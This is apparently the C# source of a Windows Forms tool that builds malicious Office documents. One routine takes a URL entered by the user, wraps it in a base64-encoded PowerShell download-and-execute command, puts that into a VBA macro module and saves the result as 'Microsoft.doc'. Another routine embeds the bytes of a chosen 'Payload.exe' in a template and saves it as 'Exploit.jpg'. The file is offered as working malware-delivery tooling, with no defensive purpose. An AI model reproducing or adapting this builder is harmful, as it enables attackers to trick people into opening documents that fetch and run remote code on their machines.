using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Word.Properties;
using Aspose.Words.Vba;
using System.Reflection;

namespace Word
{
    public partial class Office : Form
    {

        public Office()
        {
            InitializeComponent();
        }

        private void Office_Load(object sender, EventArgs e)
        {

        }

        public string sh(byte[] xx)
        {
            StringBuilder stringBuilder = new StringBuilder();
            foreach (byte value in xx)
            {
                stringBuilder.Append(value);
                stringBuilder.Append(",");
            }
            return stringBuilder.ToString().Remove(checked(stringBuilder.Length - 1));
        }
        public void merda(string valor)
        {
            try
            {
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "Microsoft Office Exploit | .doc";
                saveFileDialog.FileName = "Microsoft.doc";

                string command = $"IEX (New-Object Net.WebClient).DownloadString('{valor}');oawnduawdnnhn9283h1921nawodanfiawbdniufbnaidwuaifuabiufbaiudbhjawdbafhj";
                byte[] bytes = Encoding.Unicode.GetBytes(command);
                string base64Data = Convert.ToBase64String(bytes);
                string encodedCommand = $"{base64Data}";
                string lerFile = Properties.Resources.word;
                lerFile = lerFile.Replace("Fsociety_2023", encodedCommand);
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                var resourceName = "Word.Resources.template.doc";
                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                {
                    var doc = new Aspose.Words.Document(stream);
                    VbaProject project = doc.VbaProject;
                    VbaModule module = new VbaModule();
                    module.Name = "NewModule";
                    module.Type = VbaModuleType.ProceduralModule;
                    module.SourceCode = lerFile;
                    project.Modules.Add(module);
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        try
                        {
                            doc.Save("C:\\ProgramData\\modified_document.doc");
                            System.IO.File.Move("C:\\ProgramData\\modified_document.doc", saveFileDialog.FileName);
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show("Ir o cara e gordo!");
                        }
                    }
                }
            }catch (Exception ex)
            {
                MessageBox.Show("Ir o cara e gordo!");
            }

        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
           

        }

        private void guna2TextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                openFileDialog.Filter = "|*.exe";
                openFileDialog.FileName = "Payload.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string newValue = this.sh(File.ReadAllBytes(openFileDialog.FileName));
                    string value = Resources.rump.Replace("CLIENT", newValue);
                    MemoryStream stream = new MemoryStream();
                    StreamWriter writer = new StreamWriter(stream);
                    writer.Write(value);
                    writer.Flush();
                    stream.Seek(0, SeekOrigin.Begin);
                    StreamReader reader = new StreamReader(stream);
                    string data = reader.ReadToEnd();

                    stream.Close();
                    SaveFileDialog saveFileDialog = new SaveFileDialog();
                    saveFileDialog.Filter = "|*.jpg";
                    saveFileDialog.FileName = "Exploit.jpg";
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        System.IO.File.WriteAllBytes(saveFileDialog.FileName, stream.ToArray());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Ir o cara e gordo!");
            }
        }

        private void guna2Panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void guna2Panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private void guna2PictureBox2_Click(object sender, EventArgs e)
        {
            merda(guna2TextBox1.Text);
        }
    }
}
